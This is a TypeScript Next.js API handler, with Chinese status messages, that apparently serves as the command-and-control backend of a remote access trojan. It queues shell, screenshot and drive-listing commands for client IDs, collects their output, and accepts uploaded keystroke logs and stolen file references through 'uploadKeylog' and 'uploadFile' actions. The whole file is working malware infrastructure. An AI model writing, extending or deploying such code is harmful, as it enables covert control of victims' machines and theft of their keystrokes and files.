import { NextApiRequest, NextApiResponse } from 'next'

interface Command {
  id: string
  command: string
  type: string
  timestamp: number
}

interface CommandResult {
  commandId: string
  output: string
  timestamp: number
}

const commandQueue = new Map<string, Command[]>()
const commandResults = new Map<string, CommandResult[]>()

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { action, clientId } = req.query
  const cId = clientId as string

  switch (action) {
    case 'getCommand': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const queue = commandQueue.get(cId) || []
      if (queue.length > 0) {
        const cmd = queue.shift()
        commandQueue.set(cId, queue)
        res.status(200).json({ status: 'success', command: cmd })
      } else {
        res.status(200).json({ status: 'success', command: null })
      }
      break
    }

    case 'sendCommand': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const { command, type } = req.body
      const allowedEmptyCommands = ['screenshot', 'ping', 'drives']
      
      if (!command && !allowedEmptyCommands.includes(type || '')) {
        res.status(400).json({ status: 'error', message: '缺少命令内容' })
        break
      }
      
      if (!commandQueue.has(cId)) {
        commandQueue.set(cId, [])
      }
      
      const cmd: Command = {
        id: `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        command: command || '',
        type: type || 'cmd',
        timestamp: Date.now()
      }
      
      commandQueue.get(cId)?.push(cmd)
      res.status(200).json({ status: 'success', commandId: cmd.id })
      break
    }

    case 'reportResult': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const { commandId, output } = req.body
      if (!commandId) {
        res.status(400).json({ status: 'error', message: '缺少命令ID' })
        break
      }
      
      if (!commandResults.has(cId)) {
        commandResults.set(cId, [])
      }
      
      const result: CommandResult = {
        commandId,
        output: output || '',
        timestamp: Date.now()
      }
      
      commandResults.get(cId)?.push(result)
      res.status(200).json({ status: 'success', message: '结果已报告' })
      break
    }

    case 'getResult': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const { commandId } = req.query
      
      if (commandId) {
        const results = commandResults.get(cId) || []
        const result = results.find(r => r.commandId === commandId)
        if (result) {
          res.status(200).json({ status: 'success', result })
        } else {
          res.status(200).json({ status: 'success', result: null })
        }
      } else {
        const results = commandResults.get(cId) || []
        if (results.length > 0) {
          const latestResult = results[results.length - 1]
          res.status(200).json({ status: 'success', result: latestResult })
        } else {
          res.status(200).json({ status: 'success', result: null })
        }
      }
      break
    }

    case 'clearResults': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      commandResults.delete(cId)
      res.status(200).json({ status: 'success', message: '结果已清空' })
      break
    }

    case 'uploadKeylog': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const { logs } = req.body
      if (!commandResults.has(cId)) {
        commandResults.set(cId, [])
      }
      
      const result: CommandResult = {
        commandId: `keylog_${Date.now()}`,
        output: logs,
        timestamp: Date.now()
      }
      
      commandResults.get(cId)?.push(result)
      res.status(200).json({ status: 'success', message: '键盘记录已上传' })
      break
    }

    case 'uploadFile': {
      if (!cId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const { fileName, fileUrl } = req.body
      if (!fileName || !fileUrl) {
        res.status(400).json({ status: 'error', message: '缺少文件名或URL' })
        break
      }
      
      if (!commandResults.has(cId)) {
        commandResults.set(cId, [])
      }
      
      const result: CommandResult = {
        commandId: `file_${Date.now()}`,
        output: JSON.stringify({ fileName, fileUrl }),
        timestamp: Date.now()
      }
      
      commandResults.get(cId)?.push(result)
      res.status(200).json({ status: 'success', message: '文件信息已上传' })
      break
    }

    default: {
      res.status(400).json({ status: 'error', message: '未知操作' })
    }
  }
}
